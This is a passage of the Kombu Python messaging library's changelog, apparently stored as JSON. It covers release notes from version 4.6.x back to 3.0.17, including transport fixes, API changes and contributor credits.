(1064)\n- Fix maybe declare (1066)\n- Revert \"Revert \"Use SIMEMBERS instead of SMEMBERS to check for queue (Redis Broker)\n- Fix MongoDB backend to work properly with TTL (1076)\n- Make sure that max_retries=0 is treated differently than None (1080)\n- Bump py-amqp to 2.5.1\n\n\n.. _version-4.6.3:\n\n", "4.6.3": "=====\n:release-date: 2019-06-15 12:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert FastUUID for kombu 4.6\n\n\n.. _version-4.6.2:\n\n", "4.6.2": "=====\n:release-date: 2019-06-15 12:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix sbugs and regressions\n\n\n.. _version-4.6.1:\n\n", "4.6.1": "=====\n:release-date: 2019-06-06 10:30 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix some newly introduced bug in kombu 4.6\n\n.. _version-4.6.0:\n\n", "4.6.0": "=====\n:release-date: 2019-05-30 15:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Dropped python 3.4\n\n- Bump py-amqp to 2.5.0\n\n- Use SIMEMBERS instead of SMEMBERS to check for queue (redis broker)\n\n  * Add `_lookup_direct` method to virtual channel. (994)\n\n  Add possibility to optimize lookup for queue in direct\n  exchange set.\n\n  * Add `_lookup_direct` method to redis virtual channel. (994)\n\n  Use `SISMEMBER` instead of `SMEMBERS` command to check if queue\n  exists in a set. Time complexity is increased from O(N) to O(1)\n  where N is the set cardinality.\n\n  Contributed by **Stevan Milic** and **Asif Saif Uddin**\n\n- Include priority in properties only if it's not None.\n  Since we attempt to serialize the priority property if it exists\n  in the dictionary it must be an integer.\n\n  Contributed by **Omer Katz**\n\n- Removed dangerous default mutable arguments from function\n  definitions where appropriate.\n\n  Contributed by **Todd Cook**\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n  - **Asif Saif Uddin**\n\n.. _version-4.5.0:\n\n", "4.5.0": "=====\n:release-date: 2019-03-3 18:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- The Redis transport now supports a custom separator for keys.\n\n  Previously when storing a key in Redis which represents a queue\n  we used the hardcored value ``\\x06\\x16`` separator to store\n  different attributes of the queue in the queue's name.\n\n  The separator is now configurable using the sep\n  transport option:\n\n  .. code-block:: python\n\n    with Connection('redis://', transport_options={\n            'sep': ':',\n        }):\n         ...\n        pass\n\n  Contributed by **Joris Beckers**\n\n- When the SQS server returns a timeout we ignore it and keep trying\n  instead of raising an error.\n\n  This will prevent Celery from raising an error and hanging.\n\n  Contributed by **Erwin Rossen**\n\n- Properly declare async support for the Qpid transport.\n\n  If you are using this transport we strongly urge you to upgrade.\n\n  Contributed by **Rohan McGovern**\n\n- Revert `celery/kombu906 <https://github.com/celery/kombu/pull/906>`_ and\n  introduce unique broadcast queue names as an optional keyword argument.\n\n  If you want each broadcast queue to have a unique name specify `unique=True`:\n\n  .. code-block:: pycon\n\n    >>> from kombu.common import Broadcast\n    >>> q = Broadcast(queue='foo', unique=True)\n    >>> q.name\n    'foo.7ee1ac20-cda3-4966-aaf8-e7a3bb548688'\n    >>> q = Broadcast(queue='foo')\n    >>> q.name\n    'foo'\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n\n.. _version-4.4.0:\n\n", "4.4.0": "=====\n:release-date: 2019-03-3 9:00 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Restore bz2 import checks in compression module.\n\n  The checks were removed in `celery/kombu938 <https://github.com/celery/kombu/pull/938>`_ due to assumption that it only affected Jython.\n  However, bz2 support can be missing in Pythons built without bz2 support.\n\n  Contributed by **Patrick Woods**\n\n- Fix regression that occurred in 4.3.0\n  when parsing  Redis Sentinel master URI containing password.\n\n  Contributed by **Peter Lithammer**\n\n- Handle the case when only one Redis Sentinel node is provided.\n\n  Contributed by **Peter Lithammer**\n\n- Support SSL URL parameters correctly for `rediss://`` URIs.\n\n  Contributed by **Paul Bailey**\n\n- Revert `celery/kombu954 <https://github.com/celery/kombu/pull/954>`_.\n  Instead bump the required redis-py dependency to 3.2.0\n  to include this fix `andymccurdy/redis-py4e1e748 <https://github.com/andymccurdy/redis-py/commit/4e1e74809235edc19e03edb79c97c80a3e4e9eca>`_.\n\n  Contributed by **Peter Lithammer**\n\n- Added support for broadcasting using a regular expression pattern\n  or a glob pattern to multiple Pidboxes.\n\n  Contributed by **Jason Held**\n\n.. _version-4.3.0:\n\n", "4.3.0": "=====\n:release-date: 2019-01-14 7:00 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Added Python 3.7 support.\n\n  Contributed by **Omer Katz**, **Mads Jensen** and **Asif Saif Uddin**\n\n- Avoid caching queues which are declared with a TTL.\n\n  Queues that are declared with a TTL are now also be excluded from the\n  in-memory cache in case they expire between publishes on the same channel.\n\n  Contributed by **Matt Yule-Bennett**\n\n- Added an index to the Message table for the SQLAlchemy transport.\n\n  The index allows to effectively sorting the table by the message's timestamp.\n\n  .. note::\n\n    We do not provide migrations for this model yet.\n    You will need to add the index manually if you are already\n    using the SQLAlchemy transport.\n\n    The syntax may vary between databases.\n    Please refer to your database's documentation for instructions.\n\n  Contributed by **Mikhail Shcherbinin**\n\n- Added a timeout that limits the amount of time we retry\n  to reconnect to a transport.\n\n  Contributed by **:github_user:`tothegump`**\n\n- :class:``celery.asynchronous.hub.Hub`` is now reentrant.\n\n  This allows calling :func:`celery.bin.celery.main` to revive a worker in\n  the same process after rescuing from shutdown (:class:``SystemExit``).\n\n  Contributed by **Alan Justino da Silva**\n\n- Queues now accept string exchange names as arguments as documented.\n\n  Tests were added to avoid further regressions.\n\n  Contributed by **Antonio Gutierrez**\n\n- Specifying names for broadcast queues now work as expected.\n\n  Previously, named broadcast queues did not create multiple queues per worker.\n  They incorrectly declared the named queue which resulted in one queue per\n  fanout exchange, thus missing the entire point of a fanout exchange.\n  The behavior is now matched to unnamed broadcast queues.\n\n  Contributed by **Kuan Hsuan-Tso**\n\n- When initializing the Redis transport in conjunction with gevent\n  restore all unacknowledged messages to queue.\n\n  Contributed by **Gal Cohen**\n\n- Allow :class:``kombu.simple.SimpleQueue`` to pass queue_arguments to Queue object.\n\n  This allows :class:``kombu.simple.SimpleQueue`` to connect to RabbitMQ queues with\n  custom arguments like 'x-queue-mode'='lazy'.\n\n  Contributed by **C Blue Neeh**\n\n- Add support for 'rediss' scheme for secure Redis connections.\n\n  The rediss scheme defaults to the least secure form, as\n  there is no suitable default location for `ca_certs`. The recommendation\n  would still be to follow the documentation and specify `broker_use_ssl` if\n  coming from celery.\n\n  Contributed by **Daniel Blair**\n\n- Added the Azure Storage Queues transport.\n\n  The transport is implemented on top of Azure Storage\n  Queues. This offers a simple but scalable and low-cost PaaS\n  transport for Celery users in Azure. The transport is intended to be\n  used in conjunction with the Azure Block Blob Storage backend.\n\n  Contributed by **Clemens Wolff**, **:github_user:`ankurokok`**,\n  **Denis Kisselev**, **Evandro de Paula**, **Martin Peck**\n  and **:github_user:`michaelperel`**\n\n- Added the Azure Service Bus transport.\n\n  The transport is implemented on top of Azure Service Bus and\n  offers PaaS support for more demanding Celery workloads in Azure.\n  The transport is intended to be used in conjunction with the Azure\n  CosmosDB backend.\n\n  Contributed by **Clemens Wolff**, **:github_user:`ankurokok`**,\n  **Denis Kisselev**, **Evandro de Paula**, **Martin Peck**\n  and **:github_user:`michaelperel`**\n\n- Drop remaining mentions of Jython support completely.\n\n  Contributed by **Asif Saif Uddin** and **Mads Jensen**\n\n- When publishing messages to the Pidbox, retry if an error occurs.\n\n  Contributed by **Asif Saif Uddin**\n\n- Fix infinite loop in :method:``kombu.asynchronous.hub.Hub.create_loop``.\n\n  Previous attempt to fix the problem (PR kombu/760) did not consider\n  an edge case. It is now fixed.\n\n  Contributed by **Vsevolod Strukchinsky**\n\n- Worker shutdown no longer duplicates messages when using the SQS broker.\n\n  Contributed by **Mintu Kumar Sah**\n\n- When using the SQS broker, prefer boto's default region before our hardcoded default.\n\n  Contributed by **Victor Villas**\n\n- Fixed closing of shared redis sockets which previously caused Celery to hang.\n\n  Contributed by **Alexey Popravka**\n\n- the `Pyro`_ transport (:mod:`kombu.transport.pyro`) now works with\n  recent Pyro versions. Also added a Pyro Kombu Broker that this transport\n  needs for its queues.\n\n  Contributed by **Irmen de Jong**\n\n- Handle non-base64-encoded SQS messages.\n\n  Fix contributed by **Tim Li**, **Asif Saif Uddin** and **Omer Katz**.\n\n- Move the handling of Sentinel failures to the redis library itself.\n\n  Previously, Redis Sentinel worked only if the first node's sentinel\n  service in the URI was up. A server outage would have caused downtime.\n\n  Contributed by **Brian Price**\n\n- When using Celery and the pickle serializer with binary data as part of the\n  payload, `UnicodeDecodeError` would be raised as the content was not utf-8.\n  We now replace on errors.\n\n  Contributed by **Jian Dai**\n\n- Allow setting :method:``boto3.sqs.create_queue`` Attributes via transport_options.\n\n  Contributed by **Hunter Fernandes**\n\n- Fixed infinite loop when entity.channel is replaced by revive() on connection\n  drop.\n\n  Contributed by **Tzach Yarimi**\n\n- Added optional support for Brotli compression.\n\n  Contributed by **Omer Katz**\n\n- When using the SQS broker, FIFO queues with names that ended with the 'f' letter\n  were incorrectly parsed. This is now fixed.\n\n  Contributed by **Alex Vishnya** and **Ilya Konstantinov**\n\n-  Added optional support for LZMA compression.\n\n  Contributed by **Omer Katz**\n\n- Added optional support for ZStandard compression.\n\n  Contributed by **Omer Katz**\n\n- Require py-amqp 2.4.0 as the minimum version.\n\n  Contributed by **Asif Saif Uddin**\n\n- The value of DISABLE_TRACEBACKS environment variable is now respected on debug, info\n  and warning logger level.\n\n  Contributed by **Ludovic Rivallain**\n\n- As documented in kombu/741 and eventlet/eventlet415\n  there is a mismatch between the monkey-patched eventlet queue\n  and the interface Kombu is expecting.\n  This causes Celery to crash when the `broker_pool_limit`\n  configuration option is set\n  eventlet/eventlet415 suggests that the mutex can be a noop.\n  This is now the case.\n\n  Contributed by **Josh Morrow**\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n  - **Mads Jensen**\n  - **Asif Saif Uddin**\n  - **Lars Rinn**\n\n- Documentation improvements by:\n\n  - **Jon Dufresne**\n  - **Fay Cheng**\n  - **Asif Saif Uddin**\n  - **Kyle Verhoog**\n  - **Noah Hall**\n  - **:github_user:`brabiega`**\n\n.. _version-4.2.2-post1:\n\n", "4.2.2post1": "===========\n:release-date: 2019-01-01 04:00 P.M IST\n:release-by: Omer Katz\n\n.. note::\n\n  The previous release contained code from master.\n  It is now deleted from PyPi.\n  Please use this release instead.\n\n- No changes since previous release.\n\n.. _version-4.2.2:\n\n", "4.2.2": "=====\n:release-date: 2018-12-06 04:30 P.M IST\n:release-by: Omer Katz\n\n- Support both Redis client version 2.x and version 3.x.\n\n  Contributed by **Ash Berlin-Taylor** and **Jeppe Fihl-Pearson**\n\n.. _version-4.2.1:\n\n", "4.2.1": "=====\n:release-date: 2018-05-21 09:00 A.M IST\n:release-by: Omer Katz\n\n.. note::\n\n  The 4.2.0 release contained remains of the ``async`` module by accident.\n  This is now fixed.\n\n- Handle librabbitmq fileno raising a ValueError when socket is not connected.\n\n  Contributed by **Bryan Shelton**\n\n.. _version-4.2.0:\n\n", "4.0": "===\n:release-date: 2016-10-28 16:45 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.0.\n\n    The new py-amqp version have been refactored for better performance,\n    using modern Python socket conventions, and API consistency.\n\n- No longer depends on :mod:`anyjson`.\n\n    Kombu will now only choose between :pypi:`simplejson` and the built-in\n    :mod:`json`.\n\n    Using the latest version of simplejson is recommended:\n\n    .. code-block:: console\n\n        $ pip install -U simplejson\n\n- Removed transports that are no longer supported in this version:\n\n    - Django ORM transport\n    - SQLAlchemy ORM transport\n    - Beanstalk transport\n    - ZeroMQ transport\n    - amqplib transport (use pyamqp).\n\n- API Changes\n\n    * Signature of :class:`kombu.Message` now takes body as first argment.\n\n        It used to be ``Message(channel, body=body, **kw)``, but now it's\n        ``Message(body, channel=channel, **kw)``.\n\n        This is unlikey to affect you, as the Kombu API does not have\n        users instantiate messages manually.\n\n- New SQS transport\n\n    Donated by NextDoor, with additional contributions from mdk.\n\n    .. note::\n\n        ``kombu[sqs]`` now depends on :pypi:`pycurl`.\n\n- New Consul transport.\n\n    Contributed by **Wido den Hollander**.\n\n- New etcd transport.\n\n    Contributed by **Stephen Milner**.\n\n- New Qpid transport.\n\n    It was introduced as an experimental transport in Kombu 3.0, but is now\n    mature enough to be fully supported.\n\n    Created and maintained by **Brian Bouterse**.\n\n- Redis: Priority 0 is now lowest, 9 is highest.\n  (**backward incompatible**)\n\n    This to match how priorities in AMQP works.\n\n    Fix contributed by **Alex Koshelev**.\n\n- Redis: Support for Sentinel\n\n    You can point the connection to a list of sentinel URLs like:\n\n    .. code-block:: text\n\n        sentinel://0.0.0.0:26379;sentinel://0.0.0.0:26380/...\n\n    where each sentinel is separated by a `;`. Multiple sentinels are handled\n    by :class:`kombu.Connection` constructor, and placed in the alternative\n    list of servers to connect to in case of connection failure.\n\n   Contributed by **Sergey Azovskov**, and **Lorenzo Mancini**\n\n- RabbitMQ Queue Extensions\n\n    New arguments have been added to :class:`kombu.Queue` that lets\n    you directly and conveniently configure the RabbitMQ queue extensions.\n\n    - ``Queue(expires=20.0)``\n\n        Set queue expiry time in float seconds.\n\n        See :attr:`kombu.Queue.expires`.\n\n    - ``Queue(message_ttl=30.0)``\n\n        Set queue message time-to-live float seconds.\n\n        See :attr:`kombu.Queue.message_ttl`.\n\n    - ``Queue(max_length=1000)``\n\n        Set queue max length (number of messages) as int.\n\n        See :attr:`kombu.Queue.max_length`.\n\n    - ``Queue(max_length_bytes=1000)``\n\n        Set queue max length (message size total in bytes) as int.\n\n        See :attr:`kombu.Queue.max_length_bytes`.\n\n    - ``Queue(max_priority=10)``\n\n        Declare queue to be a priority queue that routes messages\n        based on the ``priority`` field of the message.\n\n        See :attr:`kombu.Queue.max_priority`.\n\n- RabbitMQ: ``Message.ack`` now supports the ``multiple`` argument.\n\n    If multiple is set to True, then all messages received before\n    the message being acked will also be acknowledged.\n\n- ``amqps://`` can now be specified to require SSL (Issue 610).\n\n- ``Consumer.cancel_by_queue`` is now constant time.\n\n- ``Connection.ensure*`` now raises :exc:`kombu.exceptions.OperationalError`.\n\n    Things that can be retried are now reraised as\n    :exc:`kombu.exceptions.OperationalError`.\n\n- Redis: Fixed SSL support.\n\n    Contributed by **Robert Kolba**.\n\n- New ``Queue.consumer_arguments`` can be used for the ability to\n  set consumer priority via ``x-priority``.\n\n  See https://www.rabbitmq.com/consumer-priority.html\n\n  Example:\n\n  .. code-block:: python\n\n        Queue(\n            'qname',\n            exchange=Exchange('exchange'),\n            routing_key='qname',\n            consumer_arguments={'x-priority': 3},\n        )\n\n- Queue/Exchange: ``no_declare`` option added (also enabled for\n  internal amq. exchanges) (Issue 565).\n\n- JSON serializer now calls ``obj.__json__`` for unsupported types.\n\n    This means you can now define a ``__json__`` method for custom\n    types that can be reduced down to a built-in json type.\n\n    Example:\n\n    .. code-block:: python\n\n        class Person:\n            first_name = None\n            last_name = None\n            address = None\n\n            def __json__(self):\n                return {\n                    'first_name': self.first_name,\n                    'last_name': self.last_name,\n                    'address': self.address,\n                }\n\n- JSON serializer now handles datetimes, Django promise, UUID and Decimal.\n\n- Beanstalk: Priority 0 is now lowest, 9 is highest.\n  (**backward incompatible**)\n\n    This to match how priorities in AMQP works.\n\n    Fix contributed by **Alex Koshelev**.\n\n- Redis: now supports SSL using the ``ssl`` argument to\n  :class:`~kombu.Connection`.\n\n- Redis: Fanout exchanges are no longer visible between vhosts,\n  and fanout messages can be filtered by patterns.\n  (**backward incompatible**)\n\n    It was possible to enable this mode previously using the\n    ``fanout_prefix``, and ``fanout_patterns``\n    transport options, but now these are enabled by default.\n\n    If you want to mix and match producers/consumers running different\n    versions you need to configure your kombu 3.x clients to also enable\n    these options:\n\n    .. code-block:: pycon\n\n        >>> Connection(transport_options={\n            'fanout_prefix': True,\n            'fanout_patterns': True,\n        })\n\n- Pidbox: Mailbox new arguments: TTL and expiry.\n\n    Mailbox now supports new arguments for controlling\n    message TTLs and queue expiry, both for the mailbox\n    queue and for reply queues.\n\n    - ``queue_expires`` (float/int seconds).\n    - ``queue_ttl`` (float/int seconds).\n    - ``reply_queue_expires`` (float/int seconds).\n    - ``reply_queue_ttl`` (float/int seconds).\n\n    All take seconds in int/float.\n\n    Contributed by **Alan Justino**.\n\n- Exchange.delivery_mode now defaults to :const:`None`, and the default\n  is instead set by ``Producer.publish``.\n\n- :class:`~kombu.Consumer` now supports a new ``prefetch_count`` argument,\n  which if provided will force the consumer to set an initial prefetch count\n  just before starting.\n\n- Virtual transports now stores ``priority`` as a property, not in\n  ``delivery_info``, to be compatible with AMQP.\n\n- ``reply_to`` argument to ``Producer.publish`` can now be\n  :class:`~kombu.Queue` instance.\n\n- Connection: There's now a new method\n  ``Connection.supports_exchange_type(type)`` that can be used to check if the\n  current transport supports a specific exchange type.\n\n- SQS: Consumers can now read json messages not sent by Kombu.\n\n    Contributed by **Juan Carlos Ferrer**.\n\n- SQS: Will now log the access key used when authentication fails.\n\n    Contributed by **Hank John**.\n\n- Added new :class:`kombu.mixins.ConsumerProducerMixin` for consumers that\n  will also publish messages on a separate connection.\n\n- Messages: Now have a more descriptive ``repr``.\n\n    Contributed by **Joshua Harlow**.\n\n- Async: HTTP client based on curl.\n\n- Async: Now uses `poll` instead of `select` where available.\n\n- MongoDB: Now supports priorities\n\n    Contributed by **Alex Koshelev**.\n\n- Virtual transports now supports multiple queue bindings.\n\n    Contributed by **Federico Ficarelli**.\n\n- Virtual transports now supports the anon exchange.\n\n    If when publishing a message, the exchange argument is set to '' (empty\n    string), the routing_key will be regarded as the destination queue.\n\n    This will bypass the routing table compeltely, and just deliver the\n    message to the queue name specified in the routing key.\n\n- Zookeeper: Transport now uses the built-in suport in kazoo to handle\n  failover when using a list of server names.\n\n    Contributed by **Joshua Harlow**.\n\n- ConsumerMixin.run now passes keyword arguments to .consume.\n\nDeprecations and removals\n-------------------------\n\n- The deprecated method ``Consumer.add_queue_from_dict`` has been removed.\n\n    Use instead:\n\n    .. code-block:: python\n\n        consumer.add_queue(Queue.from_dict(queue_name, **options))\n\n- The deprecated function ``kombu.serialization.encode`` has been removed.\n\n    Use :func:`kombu.serialization.dumps` instead.\n\n- The deprecated function ``kombu.serialization.decode`` has been removed.\n\n    Use :func:`kombu.serialization.loads` instead.\n\n- Removed module ``kombu.syn``\n\n    ``detect_environment`` has been moved to kombu.utils.compat\n\n.. _version-3.0.37:\n\n", "3.0.37": "======\n:release-date: 2016-10-06 05:00 P.M PDT\n:release-by: Ask Solem\n\n- Connection: Return value of ``.info()`` was no longer JSON serializable,\n  leading to \"itertools.cycle object not JSON serializable\"\n  errors (Issue 635).\n\n.. _version-3.0.36:\n\n", "3.0.36": "======\n:release-date: 2016-09-30 03:06 P.M PDT\n:release-by: Ask Solem\n\n- Connection: Fixed bug when cloning connection with alternate urls.\n\n    Fix contributed by Emmanuel Cazenave.\n\n- Redis: Fixed problem with unix socket connections.\n\n    https://github.com/celery/celery/issues/2903\n\n    Fix contributed by Raphael Michel.\n\n- Redis: Fixed compatibility with older redis-py versions (Issue 576).\n\n- Broadcast now retains queue name when being copied/pickled (Issue 578).\n\n.. _version-3.0.35:\n\n", "3.0.35": "======\n:release-date: 2016-03-22 11:22 P.M PST\n:release-by: Ask Solem\n\n- msgpack: msgpack support now requires msgpack-python > 0.4.7.\n\n- Redis: TimeoutError was no longer handled as a recoverable error.\n\n- Redis: Adds the ability to set more Redis connection options\n  using ``Connection(transport_options={...})``.\n\n    - ``socket_connect_timeout``\n    - ``socket_keepalive`` (requires :mod:`redis-py` > 2.10)\n    - ``socket_keepalive_options`` (requires :mod:`redis-py` > 2.10)\n\n- msgpack: Fixes support for binary/unicode data\n\n.. _version-3.0.34:\n\n", "3.0.34": "======\n:release-date: 2016-03-03 05:30 P.M PST\n:release-by: Ask Solem\n\n- Qpid: Adds async error handling.\n\n    Contributed by Brian Bouterse.\n\n- Qpid: Delivery tag is now a UUID4 (Issue 563).\n\n    Fix contributed by Brian Bouterse.\n\n- Redis: Connection.as_uri() returned malformed URLs when the\n  ``redis+socket`` scheme was ised (Issue celery/celery2995).\n\n- msgpack: Use binary encoding instead of utf-8 (Issue 570).\n\n.. _version-3.0.33:\n\n", "3.0.33": "======\n:release-date: 2016-01-08 06:36 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.9.\n\n- Redis: Fixed problem with auxilliary connections causing the main\n  consumer connection to be closed (Issue 550).\n\n- Qpid: No longer uses threads to operate, to ensure compatibility with\n  all environments (Issue 531).\n\n.. _version-3.0.32:\n\n", "3.0.32": "======\n:release-date: 2015-12-16 02:29 P.M PST\n:release-by: Ask Solem\n\n- Redis: Fixed bug introduced in 3.0.31 where the redis transport always\n  connects to localhost, regardless of host setting.\n\n.. _version-3.0.31:\n\n", "3.0.31": "======\n:release-date: 2015-12-16 12:00 P.M PST\n:release-by: Ask Solem\n\n- Redis: Fixed bug introduced in 3.0.30 where socket was prematurely\n  disconnected.\n\n- Hub: Removed debug logging message: \"Deregistered fd...\" (Issue 549).\n\n.. _version-3.0.30:\n\n", "3.0.30": "======\n:release-date: 2015-12-07 12:28 A.M PST\n:release-by: Ask Solem\n\n- Fixes compatiblity with uuid in Python 2.7.11 and 3.5.1.\n\n    Fix contributed by Kai Groner.\n\n- Redis transport: Attempt at fixing problem with hanging consumer\n  after disconnected from server.\n\n- Event loop:\n    Attempt at fixing issue with 100% CPU when using the Redis transport,\n\n- Database transport: Fixed oracle compatiblity.\n\n    An \"ORA-00907: missing right parenthesis\" error could manifest when using\n    an Oracle database with the database transport.\n\n    Fix contributed by Deepak N.\n\n- Documentation fixes\n\n    Contributed by Tommaso Barbugli.\n\n.. _version-3.0.29:\n\n", "3.0.29": "======\n:release-date: 2015-10-26 11:10 A.M PDT\n:release-by: Ask Solem\n\n- Fixed serialization issue for ``bindings.as_dict()`` (Issue 453).\n\n    Fix contributed by Sergey Tikhonov.\n\n- Json serializer wrongly treated bytes as ``ascii``, not ``utf-8``\n  (Issue 532).\n\n- MongoDB: Now supports pymongo 3.x.\n\n    Contributed by Len Buckens.\n\n- SQS: Tests passing on Python 3.\n\n    Fix contributed by Felix Yan\n\n.. _version-3.0.28:\n\n", "3.0.28": "======\n:release-date: 2015-10-12 12:00 PM PDT\n:release-by: Ask Solem\n\n.. admonition:: Django transport migrations.\n\n    If you're using Django 1.8 and have already created the\n    kombu_transport_django tables, you have to run a fake initial migration:\n\n    .. code-block:: console\n\n        $ python manage.py migrate kombu_transport_django --fake-initial\n\n- No longer compatible with South by default.\n\n    To keep using kombu.transport.django with South migrations\n    you now need to configure a new location for the kombu migrations:\n\n    .. code-block:: python\n\n        SOUTH_MIGRATION_MODULES = {\n            'kombu_transport_django':\n                'kombu.transport.django.south_migrations',\n        }\n\n- Keep old South migrations in ``kombu.transport.django.south_migrations``.\n\n- Now works with Redis < 2.10 again.\n\n.. _version-3.0.27:\n\n", "3.0.27": "======\n:release-date: 2015-10-09 3:10 PM PDT\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.7.\n\n- Fixed libSystem import error on some macOS 10.11 (El Capitan) installations.\n\n    Fix contributed by Eric Wang.\n\n- Now compatible with Django 1.9.\n\n- Django: Adds migrations for the database transport.\n\n- Redis: Now depends on py-redis 2.10.0 or later (Issue 468).\n\n- QPid: Can now connect as localhost (Issue 519).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Adds support for ``login_method`` (Issue 502, Issue 499).\n\n    Contributed by Brian Bouterse.\n\n- QPid: Now reads SASL mechanism from broker string (Issue 498).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Monitor thread now properly terminated on session close (Issue 485).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Fixed file descriptor leak (Issue 476).\n\n    Fix contributed by Jeff Ortel\n\n- Docs: Fixed wrong order for entrypoint arguments (Issue 473).\n\n- ConsumerMixin: Connection error logs now include traceback (Issue 480).\n\n- BaseTransport now raises RecoverableConnectionError when disconnected\n  (Issue 507).\n\n- Consumer: Adds ``tag_prefix`` option to modify how consumer tags are\n  generated (Issue 509).\n\n.. _version-3.0.26:\n\n", "3.0.26": "======\n:release-date: 2015-04-22 06:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed compatibility with py-redis versions before 2.10.3 (Issue 470).\n\n.. _version-3.0.25:\n\n", "3.0.25": "======\n:release-date: 2015-04-21 02:00 P.M UTC\n:release-by: Ask Solem\n\n- pyamqp/librabbitmq now uses 5671 as default port when SSL is enabled\n  (Issue 459).\n\n- Redis: Now supports passwords in ``redis+socket://:passhost:port`` URLs\n  (Issue 460).\n\n- ``Producer.publish`` now defines the ``expiration`` property in support\n  of the `RabbitMQ per-message TTL extension`_.\n\n    Contributed by Anastasis Andronidis.\n\n- Connection transport attribute now set correctly for all transports.\n\n    Contributed by Alex Koshelev.\n\n- qpid: Fixed bug where the connectionw as not being closed properly.\n\n    Contributed by Brian Bouterse.\n\n- :class:`~kombu.entity.bindings` is now JSON serializable (Issue 453).\n\n    Contributed by Sergey Tikhonov.\n\n- Fixed typo in error when yaml is not installed (said ``msgpack``).\n\n    Contributed by Joshua Harlow.\n\n- Redis: Now properly handles :exc:`redis.exceptions.TimeoutError`\n  raised by :mod:`redis`.\n\n    Contributed by markow.\n\n- qpid: Adds additional string to check for when connecting to qpid.\n\n    When we connect to qpid, we need to ensure that we skip to the next SASL\n    mechanism if the current mechanism fails. Otherwise, we will keep retrying the\n    connection with a non-working mech.\n\n    Contributed by Chris Duryee.\n\n- qpid: Handle ``NotFound`` exceptions.\n\n    Contributed by Brian Bouterse.\n\n- :class:`Queue.__repr__` now makes sure return value is not unicode\n  (Issue 440).\n\n- qpid: ``Queue.purge`` incorrectly raised :exc:`AttributeErrror` if the\n  does not exist (Issue 439).\n\n    Contributed by Brian Bouterse.\n\n- Linux: Now ignores permission errors on epoll unregister.\n\n.. _`RabbitMQ per-message TTL extension`: https://www.rabbitmq.com/ttl.html\n\n.. _version-3.0.24:\n\n", "3.0.24": "======\n:release-date: 2014-11-17 11:00 P.M UTC\n:release-by: Ask Solem\n\n- The `Qpid <http://qpid.apache.org/>`_ broker is supported for Python 2.x\n  environments. The Qpid transport includes full SSL support within Kombu. See\n  the :mod:`kombu.transport.qpid` docs for more info.\n\n    Contributed by Brian Bouterse and Chris Duryee through support from Red Hat.\n\n- Dependencies: extra[librabbitmq] now requires librabbitmq 1.6.0\n\n- Docstrings for :class:`~kombu.utils.limit.TokenBucket` did not match\n  implementation.\n\n    Fix contributed by Jesse Dhillon.\n\n- :func:`~kombu.common.oid_from` accidentally called ``uuid.getnode()`` but\n  did not use the return value.\n\n    Fix contributed by Alexander Todorov.\n\n- Redis: Now ignores errors when cosing the underlying connection.\n\n- Redis: Restoring messages will now use a single connection.\n\n- ``kombu.five.monotonic``: Can now be imported even if ctypes is not\n  available for some reason (e.g. App Engine)\n\n- Documentation: Improved example to use the ``declare`` argument to\n  ``Producer`` (Issue 423).\n\n- Django: Fixed ``app_label`` for older Django versions (``< 1.7``).\n  (Issue 414).\n\n.. _version-3.0.23:\n\n", "3.0.23": "======\n:release-date: 2014-09-14 10:45 P.M UTC\n:release-by: Ask Solem\n\n- Django: Fixed bug in the Django 1.7 compatibility improvements related\n  to autocommit handling.\n\n    Contributed by Radek Czajka.\n\n- Django: The Django transport models would not be created on syncdb\n  after app label rename (Issue 406).\n\n.. _version-3.0.22:\n\n", "3.0.22": "======\n:release-date: 2014-09-04 03:00 P.M UTC\n:release-by: Ask Solem\n\n- kombu.async: Min. delay between waiting for timer was always increased to\n  one second.\n\n- Fixed bug in itermessages where message is received after the with\n  statement exits the block.\n\n    Fixed by Rumyana Neykova\n\n- Connection.autoretry: Now works with functions missing wrapped attributes\n    (``__module__``, ``__name__``, ``__doc__``).  Fixes 392.\n\n    Contributed by johtso.\n\n- Django: Now sets custom app label for ``kombu.transport.django`` to work\n  with recent changes in Django 1.7.\n\n- SimpleQueue removed messages from the wrong end of buffer (Issue 380).\n\n- Tests: Now using ``unittest.mock`` if available (Issue 381).\n\n.. _version-3.0.21:\n\n", "3.0.21": "======\n:release-date: 2014-07-07 02:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed remaining bug in ``maybe_declare`` for ``auto_delete`` exchanges.\n\n    Fix contributed by Roger Hu.\n\n- MongoDB: Creating a channel now properly evaluates a connection (Issue 363).\n\n    Fix contributed by Len Buckens.\n\n.. _version-3.0.20:\n\n", "3.0.20": "======\n:release-date: 2014-06-24 02:30 P.M UTC\n:release-by: Ask Solem\n\n- Reverts change in 3.0.17 where ``maybe_declare`` caches the declaration\n  of auto_delete queues and exchanges.\n\n    Fix contributed by Roger Hu.\n\n- Redis: Fixed race condition when using gevent and the channel is closed.\n\n    Fix contributed by Andrew Rodionoff.\n\n.. _version-3.0.19:\n\n", "3.0.19": "======\n:release-date: 2014-06-09 03:10 P.M UTC\n:release-by: Ask Solem\n\n- The wheel distribution did not support Python 2.6 by failing to list\n  the extra dependencies required.\n\n- Durable and auto_delete queues/exchanges can be be cached using\n  ``maybe_declare``.\n\n.. _version-3.0.18:\n\n", "3.0.18": "======\n:release-date: 2014-06-02 06:00 P.M UTC\n:release-by: Ask Solem\n\n- A typo introduced in 3.0.17 caused kombu.async.hub to crash (Issue 360).\n\n.. _version-3.0.17:\n\n", "3.0.17": "======\n:release-date: 2014-06-02 05:00 P.M UTC\n:release-by: Ask Solem\n\n- ``kombu[librabbitmq]`` now depends on librabbitmq 1.5.2.\n\n- Async: Event loop now selectively removes file descriptors for the mode\n  it failed in, and 